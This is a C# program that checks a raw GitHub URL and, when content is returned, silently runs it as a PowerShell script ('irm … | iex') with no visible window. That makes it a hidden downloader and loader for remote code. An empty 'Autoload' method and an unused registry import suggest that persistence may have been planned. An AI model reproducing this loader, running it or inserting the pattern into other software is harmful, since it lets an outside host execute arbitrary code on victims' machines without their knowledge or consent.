using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Xml.Linq;
using static System.Net.Mime.MediaTypeNames;

namespace CMDCommandUsingCsharp
{
    public class Program
    {
        static void Autoload() {

        }

        static bool Check(string URL)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

            StreamReader reader = new StreamReader(response.GetResponseStream());
            string content = reader.ReadToEnd();
            if(content != "\n")
            {
                return true;
            }
            return false;
        }


        static void Main(string[] args)
        {
            string url = "https://raw.githubusercontent.com/Scopper31/shit/main/cmnd2.ps1";

            if (Check(url))
            {
                var proc1 = new ProcessStartInfo();

                // '/c' tells cmd that we want it to execute the command that follows, and then exit.
                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"/c irm {url} | iex");

                // The following commands are needed to redirect the standard output. 
                //This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                // Do not create the black window.
                procStartInfo.CreateNoWindow = true;
                // Now we create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                // Get the output into a string
                string result = proc.StandardOutput.ReadToEnd();

                // Display the command output.
                //Console.WriteLine(result);
            }
            
        }
    }
}
